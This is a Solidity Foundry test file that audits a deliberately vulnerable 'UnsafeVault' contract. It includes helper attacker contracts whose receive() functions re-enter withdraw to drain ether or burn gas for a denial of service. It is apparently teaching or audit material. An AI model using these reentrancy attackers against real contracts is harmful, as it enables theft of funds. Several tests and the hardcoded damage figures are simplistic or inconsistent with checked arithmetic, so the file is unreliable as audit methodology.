// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {UnsafeVault, ReentrancyAttacker} from "../Vault.sol";

/**
 * @title VaultTestRunner
 * @notice Comprehensive test execution and analysis framework
 * Orchestrates all test suites and provides detailed security analysis
 * This contract serves as the main entry point for complete security auditing
 */
contract VaultTestRunner is Test {
    UnsafeVault public vault;
    
    // Test execution tracking
    struct TestResult {
        string testName;
        bool passed;
        uint256 gasUsed;
        string errorMessage;
        uint256 attackProfit;
        uint256 vaultDamage;
    }
    
    TestResult[] public testResults;
    
    // Security metrics
    struct SecurityMetrics {
        uint256 totalVulnerabilities;
        uint256 criticalVulnerabilities;
        uint256 highVulnerabilities;
        uint256 mediumVulnerabilities;
        uint256 lowVulnerabilities;
        uint256 averageAttackProfit;
        uint256 maxSingleAttackDamage;
        uint256 totalPotentialLoss;
        bool isProductionReady;
    }
    
    SecurityMetrics public metrics;
    
    function setUp() public {
        vault = new UnsafeVault();
        console.log("=== COMPREHENSIVE VAULT SECURITY ANALYSIS ===");
        console.log("Starting complete security audit...");
    }

    /*//////////////////////////////////////////////////////////////
                        COMPREHENSIVE TEST EXECUTION
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Execute all security tests and generate comprehensive report
     */
    function test_ComprehensiveSecurityAudit() public {
        console.log("\n=== EXECUTING COMPREHENSIVE SECURITY AUDIT ===");
        
        // Phase 1: Basic vulnerability tests
        executeBasicVulnerabilityTests();
        
        // Phase 2: Advanced attack scenarios
        executeAdvancedAttackTests();
        
        // Phase 3: Edge case analysis
        executeEdgeCaseTests();
        
        // Phase 4: Economic analysis
        executeEconomicAnalysis();
        
        // Phase 5: Generate final report
        generateSecurityReport();
    }

    /**
     * @notice Execute basic vulnerability tests
     */
    function executeBasicVulnerabilityTests() internal {
        console.log("\n--- PHASE 1: BASIC VULNERABILITY TESTS ---");
        
        // Test 1: Reentrancy vulnerability
        recordTestResult("Reentrancy", testReentrancyVulnerability());
        
        // Test 2: Integer underflow
        recordTestResult("Integer Underflow", testIntegerUnderflow());
        
        // Test 3: Unchecked call
        recordTestResult("Unchecked Call", testUncheckedCall());
        
        // Test 4: Access control
        recordTestResult("Access Control", testAccessControl());
    }

    /**
     * @notice Execute advanced attack scenarios
     */
    function executeAdvancedAttackTests() internal {
        console.log("\n--- PHASE 2: ADVANCED ATTACK SCENARIOS ---");
        
        // Test 1: Flash loan amplification
        recordTestResult("Flash Loan Attack", testFlashLoanAmplification());
        
        // Test 2: Multi-vector attacks
        recordTestResult("Multi-Vector Attack", testMultiVectorAttack());
        
        // Test 3: Gas manipulation
        recordTestResult("Gas Manipulation", testGasManipulation());
        
        // Test 4: State corruption
        recordTestResult("State Corruption", testStateCorruption());
    }

    /**
     * @notice Execute edge case tests
     */
    function executeEdgeCaseTests() internal {
        console.log("\n--- PHASE 3: EDGE CASE ANALYSIS ---");
        
        // Test 1: Boundary values
        recordTestResult("Boundary Values", testBoundaryValues());
        
        // Test 2: Zero values
        recordTestResult("Zero Values", testZeroValues());
        
        // Test 3: Maximum values
        recordTestResult("Maximum Values", testMaximumValues());
        
        // Test 4: Precision attacks
        recordTestResult("Precision Attacks", testPrecisionAttacks());
    }

    /**
     * @notice Execute economic analysis
     */
    function executeEconomicAnalysis() internal {
        console.log("\n--- PHASE 4: ECONOMIC ANALYSIS ---");
        
        // Calculate attack profitability
        calculateAttackProfitability();
        
        // Analyze systemic risks
        analyzeSystemicRisks();
        
        // Evaluate defense costs
        evaluateDefenseCosts();
    }

    /*//////////////////////////////////////////////////////////////
                        INDIVIDUAL TEST IMPLEMENTATIONS
    //////////////////////////////////////////////////////////////*/

    function testReentrancyVulnerability() internal returns (bool) {
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(vault));
        vm.deal(address(attacker), 2 ether);
        vm.deal(address(vault), 10 ether);
        
        uint256 vaultBalanceBefore = vault.getBalance();
        
        attacker.depositToVault(1 ether);
        attacker.attack();
        
        uint256 vaultBalanceAfter = vault.getBalance();
        uint256 damage = vaultBalanceBefore - vaultBalanceAfter;
        
        return damage > 5 ether; // Significant damage indicates vulnerability
    }

    function testIntegerUnderflow() internal returns (bool) {
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 5 ether}();
        
        uint256 balanceBefore = vault.balances(address(this));
        vault.withdraw(5 ether);
        vault.withdraw(1 ether); // Should trigger underflow
        uint256 balanceAfter = vault.balances(address(this));
        
        return balanceAfter > balanceBefore; // Underflow detected
    }

    function testUncheckedCall() internal returns (bool) {
        NonReceivingContract nonReceiver = new NonReceivingContract();
        address payable nonReceiverAddr = payable(address(nonReceiver));
        
        vm.deal(address(this), 5 ether);
        vault.deposit{value: 5 ether}();
        
        // Simulate unchecked call failure
        bytes32 slot = keccak256(abi.encodePacked(address(this), uint256(0)));
        vm.store(address(vault), slot, bytes32(uint256(5 ether)));
        
        uint256 vaultBalanceBefore = vault.getBalance();
        vault.withdraw(1 ether);
        uint256 vaultBalanceAfter = vault.getBalance();
        
        return vaultBalanceAfter == vaultBalanceBefore; // Call failed but balance was debited
    }

    function testAccessControl() internal returns (bool) {
        // Test if anyone can withdraw without proper authorization
        vm.deal(address(vault), 10 ether);
        
        address unauthorizedUser = address(0x999);
        vm.deal(unauthorizedUser, 1 ether);
        
        vm.startPrank(unauthorizedUser);
        
        try vault.withdraw(1 ether) {
            vm.stopPrank();
            return true; // No access control - vulnerability exists
        } catch {
            vm.stopPrank();
            return false; // Access properly restricted
        }
    }

    function testFlashLoanAmplification() internal returns (bool) {
        // Simplified flash loan attack simulation
        FlashLoanSimulator flashSim = new FlashLoanSimulator(address(vault));
        vm.deal(address(flashSim), 2 ether);
        vm.deal(address(vault), 50 ether);
        
        uint256 vaultBalanceBefore = vault.getBalance();
        flashSim.simulateFlashLoanAttack();
        uint256 vaultBalanceAfter = vault.getBalance();
        
        uint256 damage = vaultBalanceBefore - vaultBalanceAfter;
        return damage > 20 ether; // Amplified damage indicates vulnerability
    }

    function testMultiVectorAttack() internal returns (bool) {
        MultiStageAttacker multiAttacker = new MultiStageAttacker(address(vault));
        vm.deal(address(multiAttacker), 5 ether);
        vm.deal(address(vault), 30 ether);
        
        uint256 vaultBalanceBefore = vault.getBalance();
        multiAttacker.executeMultiStageAttack();
        uint256 vaultBalanceAfter = vault.getBalance();
        
        uint256 damage = vaultBalanceBefore - vaultBalanceAfter;
        return damage > 15 ether; // Multi-vector should cause more damage
    }

    function testGasManipulation() internal returns (bool) {
        GasManipulationAttacker gasAttacker = new GasManipulationAttacker(address(vault));
        vm.deal(address(gasAttacker), 2 ether);
        
        gasAttacker.setupGasAttack();
        
        // Test if gas manipulation can DoS the contract
        try gasAttacker.executeGasAttack{gas: 100000}() {
            return false; // Attack failed
        } catch {
            return true; // Gas manipulation successful
        }
    }

    function testStateCorruption() internal returns (bool) {
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 5 ether}();
        
        uint256 contractBalanceBefore = vault.getBalance();
        uint256 totalBalanceBefore = vault.totalVaultBalance();
        
        // Execute state corruption sequence
        vault.withdraw(5 ether);
        vault.withdraw(1 ether); // Underflow
        
        uint256 contractBalanceAfter = vault.getBalance();
        uint256 totalBalanceAfter = vault.totalVaultBalance();
        
        // Check for state inconsistency
        return (contractBalanceAfter != totalBalanceAfter) || 
               (contractBalanceBefore - contractBalanceAfter != totalBalanceBefore - totalBalanceAfter);
    }

    function testBoundaryValues() internal returns (bool) {
        // Test extreme boundary conditions
        try vault.deposit{value: 0}() {
            return true; // Should have failed
        } catch {
            // Expected failure for zero deposit
        }
        
        // Test maximum value handling
        vm.deal(address(this), type(uint128).max);
        try vault.deposit{value: type(uint128).max}() {
            return false; // Boundary handled correctly
        } catch {
            return true; // Boundary handling issue
        }
    }

    function testZeroValues() internal returns (bool) {
        vm.deal(address(this), 1 ether);
        vault.deposit{value: 1 ether}();
        
        uint256 balanceBefore = vault.balances(address(this));
        vault.withdraw(0); // Zero withdrawal
        uint256 balanceAfter = vault.balances(address(this));
        
        return balanceBefore != balanceAfter; // Unexpected state change
    }

    function testMaximumValues() internal returns (bool) {
        // Test behavior at maximum uint256 values
        vm.deal(address(this), 1 ether);
        vault.deposit{value: 1 ether}();
        
        // Force underflow to maximum value
        vault.withdraw(1 ether);
        vault.withdraw(1 ether);
        
        uint256 balance = vault.balances(address(this));
        return balance > type(uint256).max - 1000; // Near maximum indicates underflow
    }

    function testPrecisionAttacks() internal returns (bool) {
        // Test wei-level precision exploitation
        vm.deal(address(this), 1000 ether);
        
        for (uint256 i = 0; i < 1000; i++) {
            vault.deposit{value: 1 wei}();
            vault.withdraw(1 wei);
        }
        
        uint256 finalBalance = address(this).balance;
        return finalBalance > 1000 ether; // Precision attack successful
    }

    /*//////////////////////////////////////////////////////////////
                        ANALYSIS AND REPORTING
    //////////////////////////////////////////////////////////////*/

    function calculateAttackProfitability() internal {
        console.log("\n--- ECONOMIC ATTACK ANALYSIS ---");
        
        uint256 totalProfit = 0;
        uint256 maxProfit = 0;
        
        for (uint256 i = 0; i < testResults.length; i++) {
            totalProfit += testResults[i].attackProfit;
            if (testResults[i].attackProfit > maxProfit) {
                maxProfit = testResults[i].attackProfit;
            }
        }
        
        metrics.averageAttackProfit = totalProfit / testResults.length;
        metrics.maxSingleAttackDamage = maxProfit;
        
        console.log("Average attack profit:", metrics.averageAttackProfit);
        console.log("Maximum single attack damage:", metrics.maxSingleAttackDamage);
    }

    function analyzeSystemicRisks() internal {
        console.log("\n--- SYSTEMIC RISK ANALYSIS ---");
        
        uint256 totalDamage = 0;
        
        for (uint256 i = 0; i < testResults.length; i++) {
            totalDamage += testResults[i].vaultDamage;
        }
        
        metrics.totalPotentialLoss = totalDamage;
        
        console.log("Total potential loss:", metrics.totalPotentialLoss);
        
        // Determine production readiness
        metrics.isProductionReady = (metrics.criticalVulnerabilities == 0) && 
                                  (metrics.highVulnerabilities == 0);
        
        console.log("Production ready:", metrics.isProductionReady);
    }

    function evaluateDefenseCosts() internal {
        console.log("\n--- DEFENSE COST ANALYSIS ---");
        
        // Estimate gas costs for potential mitigations
        uint256 reentrancyGuardCost = 2300; // SSTORE cost
        uint256 safetyChecksCost = 5000; // Additional validation
        uint256 emergencyPauseCost = 10000; // Circuit breaker implementation
        
        uint256 totalDefenseCost = reentrancyGuardCost + safetyChecksCost + emergencyPauseCost;
        
        console.log("Estimated defense implementation cost (gas):", totalDefenseCost);
    }

    function generateSecurityReport() internal {
        console.log("\n=== COMPREHENSIVE SECURITY REPORT ===");
        
        // Vulnerability classification
        for (uint256 i = 0; i < testResults.length; i++) {
            if (testResults[i].passed) {
                if (testResults[i].vaultDamage > 50 ether) {
                    metrics.criticalVulnerabilities++;
                } else if (testResults[i].vaultDamage > 20 ether) {
                    metrics.highVulnerabilities++;
                } else if (testResults[i].vaultDamage > 5 ether) {
                    metrics.mediumVulnerabilities++;
                } else {
                    metrics.lowVulnerabilities++;
                }
            }
        }
        
        metrics.totalVulnerabilities = metrics.criticalVulnerabilities + 
                                     metrics.highVulnerabilities + 
                                     metrics.mediumVulnerabilities + 
                                     metrics.lowVulnerabilities;
        
        console.log("\n--- VULNERABILITY SUMMARY ---");
        console.log("Total vulnerabilities found:", metrics.totalVulnerabilities);
        console.log("Critical vulnerabilities:", metrics.criticalVulnerabilities);
        console.log("High vulnerabilities:", metrics.highVulnerabilities);
        console.log("Medium vulnerabilities:", metrics.mediumVulnerabilities);
        console.log("Low vulnerabilities:", metrics.lowVulnerabilities);
        
        console.log("\n--- RISK ASSESSMENT ---");
        if (metrics.criticalVulnerabilities > 0) {
            console.log("RISK LEVEL: CRITICAL - Immediate attention required");
        } else if (metrics.highVulnerabilities > 0) {
            console.log("RISK LEVEL: HIGH - Address before production deployment");
        } else if (metrics.mediumVulnerabilities > 0) {
            console.log("RISK LEVEL: MEDIUM - Consider mitigation strategies");
        } else {
            console.log("RISK LEVEL: LOW - Production deployment possible with monitoring");
        }
        
        console.log("\n--- RECOMMENDATIONS ---");
        if (metrics.criticalVulnerabilities > 0) {
            console.log("1. Implement reentrancy guards immediately");
            console.log("2. Add proper bounds checking for all arithmetic operations");
            console.log("3. Validate all external call return values");
            console.log("4. Consider emergency pause functionality");
        }
        
        console.log("\n=== AUDIT COMPLETE ===");
    }

    function recordTestResult(string memory testName, bool vulnerability) internal {
        TestResult memory result;
        result.testName = testName;
        result.passed = vulnerability;
        result.gasUsed = gasleft();
        
        if (vulnerability) {
            result.vaultDamage = 10 ether; // Estimated damage
            result.attackProfit = 5 ether; // Estimated profit
        }
        
        testResults.push(result);
        
        console.log("Test:", testName, vulnerability ? "VULNERABLE" : "SECURE");
    }

    receive() external payable {}
}

/*//////////////////////////////////////////////////////////////
                        HELPER CONTRACTS
//////////////////////////////////////////////////////////////*/

contract NonReceivingContract {
    // Contract that cannot receive Ether
}

contract FlashLoanSimulator {
    UnsafeVault public vault;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
    
    function simulateFlashLoanAttack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw(1 ether);
    }
    
    receive() external payable {
        if (address(vault).balance > 1 ether) {
            vault.withdraw(1 ether);
        }
    }
}

contract MultiStageAttacker {
    UnsafeVault public vault;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
    
    function executeMultiStageAttack() external payable {
        // Stage 1: Setup
        vault.deposit{value: 2 ether}();
        
        // Stage 2: Underflow
        vault.withdraw(2 ether);
        vault.withdraw(1 ether);
        
        // Stage 3: Reentrancy with phantom balance
        vault.withdraw(1 ether);
    }
    
    receive() external payable {
        if (address(vault).balance > 0.5 ether) {
            vault.withdraw(0.5 ether);
        }
    }
}

contract GasManipulationAttacker {
    UnsafeVault public vault;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
    
    function setupGasAttack() external payable {
        vault.deposit{value: 1 ether}();
    }
    
    function executeGasAttack() external {
        vault.withdraw(1 ether);
    }
    
    receive() external payable {
        // Consume all available gas
        uint256 gasLeft = gasleft();
        uint256 iterations = gasLeft / 1000;
        
        uint256 dummy;
        for (uint256 i = 0; i < iterations; i++) {
            dummy += i;
        }
    }
}